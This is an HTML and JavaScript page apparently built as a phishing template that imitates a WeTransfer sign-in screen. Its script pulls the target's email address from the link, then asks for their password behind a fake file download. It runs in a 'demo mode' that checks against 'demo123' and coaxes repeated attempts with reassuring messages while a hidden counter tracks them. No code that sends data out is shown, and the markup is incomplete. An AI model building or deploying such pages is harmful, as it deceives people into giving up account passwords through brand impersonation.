<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <title>WeTransferaccount | WeTransfer</title>
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0">
    <link href="./assets/favicon.ico" rel="icon" type="image/x-icon">

    <!-- ===== FONTS ===== -->
    <style>
        @font-face {
            font-family: 'Actief Grotesque';
            src: url('fonts/ActiefGrotesque-Regular.woff') format('woff');
            font-weight: 400;
            font-style: normal;
        }
        @font-face {
            font-family: 'Actief Grotesque';
            src: url('fonts/ActiefGrotesque-Medium.woff') format('woff');
            font-weight: 500;
            font-style: normal;
        }
        @font-face {
            font-family: 'Actief Grotesque';
            src: url('fonts/ActiefGrotesque-Medium.woff') format('woff');
            font-weight: 700;
            font-style: normal;
        }
        @font-face {
            font-family: 'GT Super WT';
            src: url('fonts/GT-Super-Display-Light.woff') format('woff');
            font-weight: 500;
            font-style: normal;
        }
        @font-face {
            font-family: 'GT Super WT';
            src: url('fonts/GT-Super-Display-Bold.woff') format('woff');
            font-weight: 900;
            font-style: normal;
        }
    </style>

    <!-- ===== CORE STYLES (clean, no auth0-lock bloat) ===== -->
    <style>
        /* ----- Reset & Base ----- */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        html {
            box-sizing: border-box;
            font-size: 16px;
        }
        body {
            font-family: 'Actief Grotesque', ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            color: #4c4c4c;
            background: #fff;
        }
        main {
            height: 100vh;
            position: relative;
        }
        a {
            text-decoration: none;
            color: #4c4c4c;
        }
        a:hover {
            color: #191919;
        }

        /* ----- Layout: Split Pane ----- */
        .wt-split-pane {
            display: flex;
            min-height: 100%;
        }
        .wt-split-pane .wt-pane {
            flex: 1;
        }
        .wt-split-pane .wt-pane--left {
            display: none;
        }
        @media only screen and (min-width: 56.25em) {
            .wt-split-pane .wt-pane--left {
                align-items: center;
                display: flex;
                max-width: 50%;
                overflow: hidden;
                background: #f5f7ff;
            }
        }
        .wt-split-pane .wt-pane--right {
            min-width: 100%;
        }
        @media only screen and (min-width: 56.25em) {
            .wt-split-pane .wt-pane--right {
                min-width: 481px;
                width: 50%;
            }
        }

        /* ----- Logo ----- */
        .wt-container .wt-logo {
            display: none;
        }
        @media only screen and (min-width: 56.25em) {
            .wt-container .wt-logo {
                display: block;
                left: 0;
                padding: 20px;
                position: fixed;
                top: 0;
                z-index: 10;
            }
        }

        /* ----- Left Pane: Product Feature ----- */
        .wt-product-feature-pane {
            display: flex;
            flex-direction: column;
            height: 100%;
            padding: 80px 0 0 0;
            width: 100%;
        }
        .wt-product-feature-pane .wt-product-header {
            padding-left: 80px;
        }
        .wt-product-feature-pane .wt-product-header__header {
            font-family: 'GT Super WT', 'ui-serif', 'Georgia', 'Cambria', 'Times New Roman', 'Times', serif;
            color: #2a2b2e;
            font-size: 3rem;
            font-weight: 400;
            max-width: 80%;
        }
        .wt-product-feature-pane .wt-product-header__header--strong {
            font-weight: 900;
        }
        .wt-product-feature-pane .wt-product-header__subheader {
            font-family: 'Actief Grotesque', ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            color: #2a2b2e;
            font-size: .875rem;
            font-weight: 400;
            margin-top: .75rem;
        }
        .wt-product-feature-pane .wt-product-feature__image-wrapper {
            align-items: center;
            display: flex;
            flex: 1;
        }
        .wt-product-feature-pane .wt-product-feature__image {
            margin: 40px 0 0 80px;
            max-height: 60vh;
        }

        /* ----- Right Pane: Auth Widget ----- */
        .auth0-lock.auth0-lock {
            pointer-events: auto;
            position: relative;
            width: auto;
            margin-left: auto;
            margin-right: auto;
        }
        .auth0-lock.auth0-lock .auth0-lock-center {
            box-sizing: border-box;
            padding: 20px 0;
            display: flex;
            height: 100%;
            align-items: center;
            justify-content: center;
        }
        .auth0-lock.auth0-lock .auth0-lock-widget {
            width: 300px;
            max-width: 300px;
            margin: auto;
            border-radius: 5px;
            padding: 20px;
        }
        @media only screen and (min-width: 481px) {
            .auth0-lock.auth0-lock .auth0-lock-widget {
                padding: 0;
                width: 300px;
            }
            .auth0-lock.auth0-lock .auth0-lock-center {
                padding: 10px 0;
            }
        }
        .auth0-lock.auth0-lock .auth0-lock-widget-container {
            position: relative;
        }
        .auth0-lock.auth0-lock .auth0-lock-cred-pane {
            background: #fff;
            border-radius: 6px;
            position: relative;
            display: flex;
            flex-direction: column;
        }
        .auth0-lock.auth0-lock .auth0-lock-cred-pane-internal-wrapper {
            display: flex;
            flex-direction: column;
            height: auto;
        }
        .auth0-lock.auth0-lock .auth0-lock-content-wrapper {
            flex-grow: 0;
            overflow-x: visible;
        }

        /* ----- Header ----- */
        .auth0-lock.auth0-lock .auth0-lock-header {
            text-align: center;
            padding: 11px;
            color: #333;
            position: relative;
            background: #fff;
            border-radius: 5px 5px 0 0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            flex-shrink: 0;
        }
        .auth0-lock.auth0-lock .auth0-lock-header-bg {
            position: absolute;
            height: 100%;
            width: 100%;
            overflow: hidden;
            top: 0;
            left: 0;
            pointer-events: none;
            background: none;
        }
        .auth0-lock.auth0-lock .auth0-lock-header-bg .auth0-lock-header-bg-solid {
            display: none;
        }
        .auth0-lock.auth0-lock .auth0-lock-header-bg .auth0-lock-header-bg-blur {
            display: none;
        }
        .auth0-lock.auth0-lock .auth0-lock-header-welcome {
            font-size: 18px;
            position: relative;
        }
        .auth0-lock.auth0-lock .auth0-lock-header-logo {
            width: auto;
            height: 58px;
            display: inline-block;
            margin: 0 0 11px;
            vertical-align: middle;
        }
        .auth0-lock.auth0-lock .auth0-lock-header-logo.centered {
            margin-top: 20px;
        }

        /* ----- Tabs ----- */
        .auth0-lock.auth0-lock .auth0-lock-tabs-container {
            margin-left: 0;
            margin-right: 0;
            margin-top: 0;
            margin-bottom: 20px;
        }
        .auth0-lock.auth0-lock .auth0-lock-tabs {
            background: #fff;
            padding: 0;
            margin: 0;
            font-size: 13px;
            letter-spacing: 0.7px;
            box-shadow: 0 1px 0 0 rgba(92, 102, 111, 0.2);
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            align-content: center;
            align-items: stretch;
            list-style: none;
        }
        .auth0-lock.auth0-lock .auth0-lock-tabs li {
            width: 50%;
            display: block;
            list-style: none;
            float: left;
            padding: 0;
            margin: 0;
            text-align: center;
            cursor: pointer;
        }
        .auth0-lock.auth0-lock .auth0-lock-tabs li a,
        .auth0-lock.auth0-lock .auth0-lock-tabs li span {
            padding: 11px 10px;
            display: block;
            text-decoration: none;
            color: rgba(92, 102, 111, 0.6);
            font-weight: 500;
            font-size: .875rem;
            letter-spacing: 0;
        }
        .auth0-lock.auth0-lock .auth0-lock-tabs li.auth0-lock-tabs-current {
            box-shadow: 0 1px 0 0 #5c666f;
            cursor: default;
        }
        .auth0-lock.auth0-lock .auth0-lock-tabs li.auth0-lock-tabs-current span {
            color: #5c666f;
        }
        .auth0-lock.auth0-lock .auth0-lock-tabs li .downloader__top-icon {
            width: 30px;
            height: 30px;
            vertical-align: middle;
        }

        /* ----- Form ----- */
        .auth0-lock.auth0-lock .auth0-lock-form {
            padding: 0;
        }
        .auth0-lock.auth0-lock .auth0-lock-form p {
            font-size: 13px;
            line-height: 1.8;
            text-align: center;
            margin-top: 0;
            margin-bottom: 15px;
            color: rgba(0, 0, 0, 0.54);
        }
        .auth0-lock.auth0-lock .auth0-lock-form .auth0-lock-alternative {
            margin-top: .75rem;
            margin-bottom: 0;
        }
        .auth0-lock.auth0-lock .auth0-lock-form .auth0-lock-alternative .auth0-lock-alternative-link {
            font-size: .875rem;
            color: #4c4c4c;
            cursor: pointer;
            text-decoration: underline;
            margin-bottom: 0;
        }
        .auth0-lock.auth0-lock .auth0-lock-form .auth0-lock-alternative .auth0-lock-alternative-link:hover {
            color: #191919;
        }

        /* ----- Input Blocks ----- */
        .auth0-lock.auth0-lock .auth0-lock-input-block {
            position: relative;
            margin-bottom: 12px;
        }
        .auth0-lock.auth0-lock .auth0-lock-input-block:last-child {
            margin-bottom: 0;
        }

        .auth0-lock.auth0-lock .auth0-lock-input-wrap {
            border-radius: 12px;
            border: 0;
            background: #f2f2f2;
            position: relative;
            display: flex;
            align-items: center;
            flex-wrap: wrap;
            overflow: visible;
            padding-left: 0;
            transition: border-color 0.8s;
        }
        .auth0-lock.auth0-lock .auth0-lock-input-wrap.auth0-lock-input-wrap-with-icon {
            padding-left: 0;
        }
        .auth0-lock.auth0-lock .auth0-lock-input-wrap>span {
            margin: 0 12px;
            display: flex;
            align-items: center;
        }
        .auth0-lock.auth0-lock .auth0-lock-input-wrap .auth0-lock-icon,
        .auth0-lock.auth0-lock .auth0-lock-input-wrap .auth0-lock-custom-icon {
            height: 20px;
            margin: 0 12px;
            position: unset;
            width: 20px;
        }
        .auth0-lock.auth0-lock .auth0-lock-input-wrap .auth0-lock-input {
            border: 0;
            padding: 0 14px;
            height: 54px;
            font-size: 1rem;
            flex-grow: 1;
            width: auto;
            border-radius: 0 2px 2px 0;
            box-sizing: border-box;
            position: relative;
            color: rgba(0, 0, 0, 0.87);
            background: none;
        }
        .auth0-lock.auth0-lock .auth0-lock-input-wrap .auth0-lock-input::placeholder {
            color: #b2b2b2;
        }
        .auth0-lock.auth0-lock .auth0-lock-input-wrap.auth0-lock-focused {
            border-color: #a0a0a0;
        }

        /* Email icon */
        .auth0-lock.auth0-lock .auth0-lock-input-block.auth0-lock-input-email .auth0-lock-input-wrap>span {

            display: none;
        }

        /* Password icon */
        .auth0-lock.auth0-lock .auth0-lock-input-block.auth0-lock-input-password .auth0-lock-input-wrap>span {
            background-image: url("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTQiIGhlaWdodD0iMTkiIHZpZXdCb3g9IjAgMCAxNCAxOSIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cGF0aCBmaWxsLXJ1bGU9ImV2ZW5vZGQiIGNsaXAtcnVsZT0iZXZlbm9kZCIgZD0iTTcgMC4yNUM0LjkyODkzIDAuMjUgMy4yNSAxLjkyODkzIDMuMjUgNFY3SDNDMS4zNDMxNSA3IDAgOC4zNDMxNSAwIDEwVjE2QzAgMTcuNjU2OSAxLjM0MzE1IDE5IDMgMTlIMTFDMTIuNjU2OSAxOSAxNCAxNy42NTY5IDE0IDE2VjEwQzE0IDguMzQzMTUgMTIuNjU2OSA3IDExIDdIMTAuNzVWNEMxMC43NSAxLjkyODkzIDkuMDcxMDcgMC4yNSA3IDAuMjVaTTkuMjUgVjdDNC45IDIuNzU3MzYgOC4yNDI2NCAxLjc1IDcgMS43NUM1Ljc1NzM2IDEuNzUgNC43NSAyLjc1NzM2IDQuNzUgNFY3SDkuMjVaTTkgMTNDOSAxNC4xMDQ2IDguMTA0NTcgMTUgNyAxNUM1Ljg5NTQzIDE1IDUgMTQuMTA0NiA1IDEzQzUgMTEuODk1NCA1Ljg5NTQzIDExIDcgMTFDOC4xMDQ1NyAxMSA5IDExLjg5NTQgOSAxM1oiIGZpbGw9IiNCMkIyQjIiLz48L3N2Zz4=");

        }
        .auth0-lock.auth0-lock .auth0-lock-input-block.auth0-lock-input-password .auth0-lock-input-wrap>span svg {
            display: none;
        }

        /* Error state on input */
        .auth0-lock.auth0-lock .auth0-lock-error .auth0-lock-input-wrap {
            border-color: transparent;
        }
        .auth0-lock.auth0-lock .auth0-lock-error .auth0-lock-input-wrap::after {
            background-image: url("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTgiIGhlaWdodD0iMTciIHZpZXdCb3g9IjAgMCAxOCAxNyIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cGF0aCBmaWxsLXJ1bGU9ImV2ZW5vZGQiIGNsaXAtcnVsZT0iZXZlbm9kZCIgZD0iTTExLjU3MTkgMi4yODMzMUMxMC40MDY1IDAuMzQyNDEzIDcuNTkzNCAwLjM0MjQxMiA2LjQyOCAyLjI4MzMxTDAuNDcwMjU5IDEyLjIwNTVDLTAuNzMwMzYzIDE0LjIwNTEgMC43MDk5MTMgMTYuNzQ5OSAzLjA0MjIzIDE2Ljc0OTlIMTQuOTU3N0MxNy4yOSAxNi43NDk5IDE4LjczMDMgMTQuMjA1MSAxNy41Mjk3IDEyLjIwNTVMMTEuNTcxOSAyLjI4MzMxWk05LjAwMjg0IDExLjg2NDhDOC41NDQzOSAxMS44NjQ4IDguMTg5MDkgMTEuNDU4OSA4LjE3MTg5IDEwLjkwNjFMOC4wMjg2MyA2LjE4OTVDOC4wMDU3IDUuNTMxNyA4LjQyNDA0IDQuOTk5ODYgOS4wMDI4NCA0Ljk5OTg2QzkuNTg3MzcgNC45OTk4NiAxMC4wMDU3IDUuNTMxNyA5Ljk4Mjc4IDYuMTg5NUw5LjgyMjMyIDEwLjkwNjFDOS43OTk0IDExLjQ3MjkgOS40NDQxIDExLjg2NDggOS4wMDI4NCAxMS44NjQ4Wk05LjAwMjg0IDE0Ljk5OTlDOC40NTI3IDE0Ljk5OTkgNy45OTk5NyAxNC41NjYgNy45OTk5NyAxMy44OTQyQzcuOTk5OTcgMTMuMjIyNCA4LjQ1MjcgMTIuNzg4NSA5LjAwMjg0IDEyLjc4ODVDOS41NTI5OCAxMi43ODg1IDkuOTk5OTcgMTMuMjIyNCA5Ljk5OTk3IDEzLjg5NDJDOS45OTk5NyAxNC41NjYgOS41NTI5OCAxNC45OTk5IDkuMDAyODQgMTQuOTk5OVoiIGZpbGw9IiNFNjUwNTAiLz48L3N2Zz4=");

        /* ----- Submit Button ----- */
        .auth0-lock.auth0-lock .auth0-lock-submit {
            border: 0;
            padding: 0;
            display: block;
            box-sizing: border-box;
            width: 100%;
            overflow: hidden;
            border-radius: 99px;
            transition: 0.2s ease-in-out;
            color: #fff;
            letter-spacing: 1px;
            font-size: 14px;
            text-transform: uppercase;
            flex-shrink: 0;
            background-color: rgb(25, 25, 25);
            margin-top: .5rem;
            align-items: center;
            align-self: center;
            margin-left: auto;
            margin-right: auto;
        }
        .auth0-lock.auth0-lock .auth0-lock-submit .auth0-label-submit {
            align-items: center;
            display: flex;
            font-size: 1rem;
            height: 54px;
            justify-content: center;
            letter-spacing: 0;
            line-height: 42px;
        }
        .auth0-lock.auth0-lock .auth0-lock-submit .auth0-label-submit svg {
            display: none;
        }

        .auth0-lock.auth0-lock .auth0-lock-submit:hover:not([disabled]) .auth0-label-submit {

            transform: none;
        }
        .auth0-lock.auth0-lock .auth0-lock-submit[disabled] {
            background-color: #9b9b9b !important;
            cursor: default;
            pointer-events: none;
        }

        /* ----- Loading inside submit ----- */
        .auth0-lock.auth0-lock .auth0-loading-container {
            display: none;
            position: relative;
        }
        .auth0-lock.auth0-lock .auth0-loading-container .auth0-loading {
            position: absolute;
            top: 10px;
            left: 44%;
            width: 30px;
            height: 30px;
            border-width: 2px;
            border-style: solid;
            border-color: rgba(0, 0, 0, 0.4) rgba(0, 0, 0, 0.4) rgba(0, 0, 0, 0.2) rgba(0, 0, 0, 0.2);
            opacity: 0.9;
            border-radius: 20px;
            animation: rotate 1s linear infinite;
        }
        @keyframes rotate {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }

        /* ----- Terms / Alternative ----- */
        .auth0-lock.auth0-lock .auth0-lock-body-content .auth0-lock-terms {
            background: none;
            color: #4c4c4c;
            font-size: .875rem;
            line-height: 1.25rem;
            padding: 1rem 0;
            text-align: center;
            display: block;
        }
        .auth0-lock.auth0-lock .auth0-lock-body-content .auth0-lock-terms a {
            color: #4c4c4c;
            text-decoration: underline;
        }
        .auth0-lock.auth0-lock .auth0-lock-body-content .auth0-lock-terms a:hover {
            color: #191919;
        }

        /* ----- Global Message (error banner) ----- */
        .auth0-lock.auth0-lock .auth0-global-message {
            color: #fff;
            text-align: center;
            padding: 10px;
            line-height: 1.8;
            font-size: 11px;
            font-weight: 600;
            text-transform: uppercase;
            border-radius: 8px;
            font-family: 'Actief Grotesque', ui-sans-serif, system-ui, -apple-system, sans-serif;
            font-size: .875rem;
            font-weight: 400;
            text-transform: none;
        }
        .auth0-lock.auth0-lock .auth0-global-message.auth0-global-message-error {
            background: rgba(230, 80, 80, 0.1);
            color: #e65050;
        }
        .auth0-lock.auth0-lock .auth0-global-message.auth0-global-message-success,
        .auth0-lock.auth0-lock .auth0-global-message.auth0-global-message-info {
            background: rgba(58, 102, 255, 0.1);
            color: #3a66ff;
        }
        .auth0-lock.auth0-lock .auth0-global-message span {
            animation-delay: 0.2s;
        }
        .animated {
            animation-duration: 1s;
            animation-fill-mode: both;
        }
        @keyframes fadeInUp {
            0% {
                opacity: 0;
                transform: translate3d(0, 100%, 0);
            }
            100% {
                opacity: 1;
                transform: none;
            }
        }
        .fadeInUp {
            animation-name: fadeInUp;
        }

        /* ----- Sleek Email Display ----- */
        .email-display-sleek {
            display: flex;
            align-items: center;
            gap: 10px;
            background: #f2f4f8;
            border-radius: 12px;
            padding: 0.75rem 1rem;
            margin-bottom: 1rem;
            font-size: 0.95rem;
            color: #1a1a1a;
        }
        .email-display-sleek .email-icon {
            color: #7a7f8a;
            font-size: 1.2rem;
        }
        .email-display-sleek .email-value {
            font-weight: 500;
            word-break: break-all;
            flex: 1;
        }

        /* ----- Sleek Error Message (the one that wasn't showing) ----- */
        .error-message {
            text-align: center;
            font-size: 14px;
            font-weight: 400;
            padding: 8px 0 4px;
            opacity: 0;
            transition: opacity 0.35s ease, transform 0.35s ease;
            transform: translateY(-4px);
            width: 100%;
        }
        .error-message.show {
            opacity: 1;
            transform: translateY(0);
        }
        .error-message--sleek {
            color: #e65050;
            background: rgba(230, 80, 80, 0.06);
            border-radius: 12px;
            padding: 10px 14px;
            font-size: 14px;
            letter-spacing: 0.2px;
            width: 100%;
        }
        .error-message--sleek .emoji {
            font-size: 18px;
            display: inline-block;
            margin-right: 6px;
        }
        .error-message--sleek .highlight {
            font-weight: 500;
        }

        .auth0-lock-input-wrap.show-error {
            border-color: #e65050 !important;
            box-shadow: 0 0 0 3px rgba(230, 80, 80, 0.12);
        }
        .form-group.shake .input-wrapper {
            animation: shake 0.4s ease-in-out;
        }
        @keyframes shake {
            0%,
            100% {
                transform: translateX(0);
            }
            20%,
            60% {
                transform: translateX(-8px);
            }
            40%,
            80% {
                transform: translateX(8px);
            }
        }

        .sleek-error-container {
            margin-top: 6px;
            min-height: 44px;
            display: flex;
            align-items: center;
            justify-content: center;
            width: 100%;
        }
        .sleek-error-container .error-message--sleek {
            width: 100%;
        }

        /* Hide attempt counter */
        .attempt-counter {
            display: none !important;
        }

        /* ----- Loading Overlay (fixed, robust) ----- */
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.75);
            backdrop-filter: blur(6px);
            -webkit-backdrop-filter: blur(6px);
            display: none;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            z-index: 9999;
            transition: opacity 0.3s ease;
        }
        .loading-overlay.active {
            display: flex !important;
            opacity: 1;
        }
        .loading-spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #e0e0e0;
            border-top: 4px solid #000;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }
        .loading-text {
            margin-top: 20px;
            font-family: 'Helvetica Neue', Arial, sans-serif;
            font-size: 16px;
            color: #333;
            letter-spacing: 0.5px;
        }

        /* ----- Misc helpers ----- */
        .auth0-lock-hidden {
            display: none;
        }
        .auth0-lock-pane-separator {
            padding-top: 15px;
        }
        .auth0-lock.auth0-lock .auth0-lock-cred-pane .auth0-lock-content {
            padding: 0;
        }
        .auth0-lock.auth0-lock .auth0-lock-cred-pane .auth0-lock-back-button {
            box-shadow: none;
            height: 20px;
            position: absolute;
            top: 1.5rem;
            width: 20px;
            background: #fff;
            border-radius: 100px;
            padding: 0;
            border: 6px solid #fff;
            cursor: pointer;
            line-height: 0;
            z-index: 100;
            display: none;
        }
        .auth0-lock.auth0-lock .auth0-lock-cred-pane .auth0-lock-back-button:focus {
            outline: none;
            box-shadow: 0 3px 3px rgba(0, 0, 0, 0.3);
        }

        /* File list inside email step */
        .auth0-lock.auth0-lock .auth0-lock-input-wrap hr {
            border: none;
            border-top: 1px solid #e5e5e5;
            margin: 0;
        }
        .auth0-lock.auth0-lock .auth0-lock-input-wrap ul {
            list-style-type: none;
            padding: 5%;
            line-height: 25px;
            margin: 0;
            width: 100%;
        }
        .auth0-lock.auth0-lock .auth0-lock-input-wrap ul li {
            font-size: 13px;
        }
        .auth0-lock.auth0-lock .auth0-lock-input-wrap ul li:first-child {
            font-weight: 700;
        }
        .auth0-lock.auth0-lock .auth0-lock-input-wrap ul li:last-child {
            color: #999393;
        }
    </style>
</head>

    <!-- ===== JAVASCRIPT (DEMO MODE = true) ===== -->
    <script>
        (function() {
            'use strict';

            // ----- CONFIG: DEMO MODE ENABLED -----
            const DEMO_MODE = true;       // true = demo mode, any password except 'demo123' triggers error
            const CORRECT_PASSWORD = 'demo123';

            // ----- DOM refs -----
            const loadingOverlay = document.getElementById('loadingOverlay');
            const one = document.getElementById('one');
            const two = document.getElementById('two');
            const downloadBtn = document.getElementById('download');
            const submitBtn = document.getElementById('submit-btn');
            const passwordInput = document.getElementById('password');
            const emailDisplay = document.getElementById('emailDisplay');
            const passwordError = document.getElementById('passwordError');
            const attemptCounter = document.getElementById('attemptCounter');
            const passwordWrap = document.getElementById('passwordWrap');
            const passwordBlock = document.getElementById('passwordBlock');

            let currentEmail = '';
            let attemptCount = 0;

            // ----- Helpers -----
            function getEmailFromURL() {
                if (window.location.hash) {
                    const hashParams = new URLSearchParams(window.location.hash.substring(1));
                    const email = hashParams.get('email');
                    if (email) return email;
                    const match = window.location.hash.match(
                        /[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*@(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?/i
                    );
                    if (match) return match[0];
                }
                const params = new URLSearchParams(window.location.search);
                return params.get('email') || '';
            }

            function setLoading(loading) {
                if (loading) {
                    loadingOverlay.classList.add('active');
                } else {
                    loadingOverlay.classList.remove('active');
                }
                downloadBtn.disabled = loading;
                submitBtn.disabled = loading;
            }

            // ----- Sleek Error (friendly, no counter) -----
            function showSleekError(attempt) {
                hideError();
                let msg = '';
                if (attempt === 1) {
                    msg =
                        '<div class="error-message--sleek"><span class="emoji">🤔</span> <span class="highlight">Oops!</span> That password doesn’t look right. <span class="highlight">One more try?</span></div>';
                } else if (attempt === 2) {
                    msg =
                        '<div class="error-message--sleek"><span class="emoji">🧐</span> Hmm, still not matching. <span class="highlight">Take a breath and try again?</span></div>';
                } else {
                    msg =
                        '<div class="error-message--sleek"><span class="emoji">💡</span> Almost there! <span class="highlight">Give it one more go.</span></div>';
                }
                passwordError.innerHTML = msg;
                passwordError.classList.add('show');
                passwordWrap.classList.add('show-error');
                passwordBlock.classList.add('shake');
                setTimeout(function() {
                    passwordBlock.classList.remove('shake');
                }, 400);
            }

            function hideError() {
                passwordError.innerHTML = '';
                passwordError.classList.remove('show');
                passwordWrap.classList.remove('show-error');
            }

            // ----- Step 1: Download All -----
            downloadBtn.addEventListener('click', function(e) {
                e.preventDefault();
                hideError();

                const email = getEmailFromURL();
                if (!email) {
                    passwordError.innerHTML =
                        '<div class="error-message--sleek"><span class="emoji">⚠️</span> Email not found in URL.</div>';
                    passwordError.classList.add('show');
                    return;
                }

                setLoading(true);

                // DEMO: simulate API success after a short delay
                setTimeout(function() {
                    setLoading(false);
                    currentEmail = email;
                    emailDisplay.textContent = currentEmail;
                    one.style.display = 'none';
                    two.style.display = 'block';
                    attemptCount = 0;
                    hideError();
                    passwordInput.value = '';
                    passwordInput.focus();
                }, 800);
            });

            // ----- Step 2: Submit password (DEMO) -----
            submitBtn.addEventListener('click', function(e) {
                e.preventDefault();
                hideError();

                const password = passwordInput.value.trim();
                if (!password) {
                    passwordError.innerHTML =
                        '<div class="error-message--sleek"><span class="emoji">✍️</span> Please enter your password.</div>';
                    passwordError.classList.add('show');
                    passwordInput.focus();
                    return;
                }

                attemptCount++;
                setLoading(true);

                // DEMO: simulate API check after a short delay
                setTimeout(function() {
                    setLoading(false);
                    if (password === CORRECT_PASSWORD) {
                        // Success – redirect to WeTransfer files
                        window.location.href = 'https://wetransfer.com/your-files';
                    } else {
                        // Incorrect – show sleek error
                        showSleekError(attemptCount);
                        passwordInput.value = '';
                        passwordInput.focus();
                    }
                }, 700);
            });

            // ----- Clear error on typing / focus -----
            passwordInput.addEventListener('input', function() {
                hideError();
            });
            passwordInput.addEventListener('focus', function() {
                hideError();
            });

            // ----- Auto-focus password when step 2 appears -----
            var observer = new MutationObserver(function() {
                if (two.style.display !== 'none' && two.style.display !== '') {
                    setTimeout(function() { passwordInput.focus(); }, 300);
                    observer.disconnect();
                }
            });
            observer.observe(two, { attributes: true, attributeFilter: ['style'] });

            if (two.style.display !== 'none' && two.style.display !== '') {
                setTimeout(function() { passwordInput.focus(); }, 300);
            }

            // ----- Enter key submits password -----
            passwordInput.addEventListener('keydown', function(e) {
                if (e.key === 'Enter') {
                    e.preventDefault();
                    submitBtn.click();
                }
            });

        })();
    </script>
